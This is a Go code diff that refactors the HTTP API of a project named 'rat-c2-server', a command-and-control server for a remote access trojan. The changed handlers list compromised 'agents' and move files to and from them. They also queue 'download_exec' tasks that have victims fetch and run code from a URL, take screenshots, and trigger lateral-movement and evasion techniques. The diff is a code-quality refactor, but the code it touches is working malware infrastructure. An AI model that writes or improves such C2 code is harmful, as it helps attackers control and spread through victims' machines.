@@ -1,7 +1,6 @@
 package api
 
 import (
-	"context"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -15,7 +14,6 @@ import (
 
 	"github.com/gin-gonic/gin"
 	"github.com/google/uuid"
-	"github.com/jmoiron/sqlx"
 
 	"rat-c2-server/internal/agent"
 	"rat-c2-server/internal/filetransfer"
@@ -114,7 +112,7 @@ func logoutHandler(c *gin.Context) {
 
 func getAgentsHandler(agentMgr *agent.Manager) gin.HandlerFunc {
 	return func(c *gin.Context) {
-		agents := agentMgr.GetAll()
+		agents := agentMgr.List()
 		c.JSON(http.StatusOK, agents)
 	}
 }
@@ -221,7 +219,11 @@ func updateAgentBinaryHandler(taskQueue *task.Queue) gin.HandlerFunc {
 func getTasksHandler(taskQueue *task.Queue) gin.HandlerFunc {
 	return func(c *gin.Context) {
 		agentID := c.Param("id")
-		tasks := taskQueue.GetByAgent(agentID)
+		tasks, err := taskQueue.GetByAgent(agentID, 100)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
 		c.JSON(http.StatusOK, tasks)
 	}
 }
@@ -229,8 +231,8 @@ func getTasksHandler(taskQueue *task.Queue) gin.HandlerFunc {
 func getTaskHandler(taskQueue *task.Queue) gin.HandlerFunc {
 	return func(c *gin.Context) {
 		id := c.Param("id")
-		t, ok := taskQueue.Get(id)
-		if !ok {
+		t, err := taskQueue.Get(id)
+		if err != nil {
 			c.JSON(http.StatusNotFound, gin.H{"error": "Task not found"})
 			return
 		}
@@ -249,7 +251,11 @@ func cancelTaskHandler(taskQueue *task.Queue) gin.HandlerFunc {
 func getFileTransfersHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 	return func(c *gin.Context) {
 		agentID := c.Param("id")
-		transfers := fileMgr.GetByAgent(agentID)
+		transfers, err := fileMgr.GetByAgent(agentID)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
 		c.JSON(http.StatusOK, transfers)
 	}
 }
@@ -274,7 +280,7 @@ func uploadFileHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 		}
 		defer src.Close()
 
-		ft, err := fileMgr.CreateUpload(agentID, remotePath, file.Size)
+		ft, err := fileMgr.CreateUpload(agentID, file.Filename, remotePath, file.Size)
 		if err != nil {
 			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 			return
@@ -297,7 +303,9 @@ func uploadFileHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 		ft.Status = "completed"
 		now := time.Now()
 		ft.CompletedAt = &now
-		fileMgr.Update(ft)
+
+		// Update in database
+		fileMgr.GetDB().Exec(`UPDATE files SET size = ?, status = ?, completed_at = ? WHERE id = ?`, ft.Size, ft.Status, ft.CompletedAt, ft.ID)
 
 		c.JSON(http.StatusOK, ft)
 	}
@@ -320,11 +328,11 @@ func downloadFileHandler(fileMgr *filetransfer.Manager, taskQueue *task.Queue) g
 			return
 		}
 
-		t := taskQueue.Add(agentID, task.TypeFileDownload, "download", map[string]interface{}{
-			"file_id":    ft.ID,
-			"remotePath": req.RemotePath,
-			"localPath":  ft.TempPath,
-		})
+		t, err := taskQueue.EnqueueDownload(agentID, req.RemotePath, ft.TempPath, 10)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
 
 		c.JSON(http.StatusOK, gin.H{
 			"file_transfer": ft,
@@ -345,20 +353,17 @@ func downloadExecHandler(fileMgr *filetransfer.Manager, taskQueue *task.Queue) g
 			return
 		}
 
-		filename := filepath.Base(req.URL)
 		ft, err := fileMgr.CreateDownloadExec(agentID, req.URL, req.Args)
 		if err != nil {
 			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 			return
 		}
 
-		t := taskQueue.Add(agentID, task.TypeDownloadExec, "download_exec", map[string]interface{}{
-			"file_id":    ft.ID,
-			"url":        req.URL,
-			"args":       req.Args,
-			"filename":   filename,
-			"localPath":  ft.TempPath,
-		})
+		t, err := taskQueue.EnqueueDownloadExec(agentID, req.URL, req.Args, 10)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
 
 		log.Printf("[API] Created download_exec task for agent %s: %s -> %s", agentID, req.URL, ft.TempPath)
 
@@ -437,7 +442,6 @@ func deleteScreenshotHandler(c *gin.Context) {
 
 func executeLateralHandler(lateralMgr interface{}) gin.HandlerFunc {
 	return func(c *gin.Context) {
-		agentID := c.Param("id")
 		var req struct {
 			Technique string                 `json:"technique" binding:"required"`
 			Target    string                 `json:"target" binding:"required"`
@@ -453,7 +457,6 @@ func executeLateralHandler(lateralMgr interface{}) gin.HandlerFunc {
 
 func executeEvasionHandler(evasionMgr interface{}) gin.HandlerFunc {
 	return func(c *gin.Context) {
-		agentID := c.Param("id")
 		var req struct {
 			Technique string                 `json:"technique" binding:"required"`
 			Options   map[string]interface{} `json:"options"`
